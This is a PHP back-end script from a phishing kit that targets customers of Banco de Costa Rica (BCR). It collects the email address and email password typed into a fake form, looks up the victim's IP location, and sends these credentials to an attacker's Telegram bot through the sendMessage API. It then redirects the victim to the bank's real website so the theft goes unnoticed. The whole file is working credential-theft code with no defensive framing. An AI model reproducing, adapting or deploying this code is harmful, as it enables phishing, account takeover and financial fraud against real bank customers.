<?php
ini_set("display_errors", 0);
include('datos_telgram.php');
session_start();



function getIP() {
   if (isset($_SERVER)) {
      if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
         return $_SERVER['HTTP_X_FORWARDED_FOR'];
      } else {
         return $_SERVER['REMOTE_ADDR'];
      }
   } else {
      if (isset($GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDER_FOR'])) {
         return $GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDED_FOR'];
      } else {
         return $GLOBALS['HTTP_SERVER_VARS']['REMOTE_ADDR'];
      }
   }
}

$myip = getIP() ;
@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$myip));
@$pais = $meta['geoplugin_countryName']; 
@$region = $meta['geoplugin_regionName'];


if( isset($_POST['mailed']) && isset($_POST['passmailed'])){


$message = "DATOS BCR\r\nEmail: ".$_POST['mailed']."\r\nClave de email: ".$_POST['passmailed']."\r\nIP: ".$myip." ".$pais." ".$region." \r\n";

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

 echo '<script>
			window.location.href="https://www.bancobcr.com/wps/portal/bcr/bancobcr/mipymes/documentos_mipymes/";
		</script>';

 session_destroy();

} else {
echo "<script type='text/javascript'>";
echo "window.location.href='index.php';";
echo "</script>";
}
?>



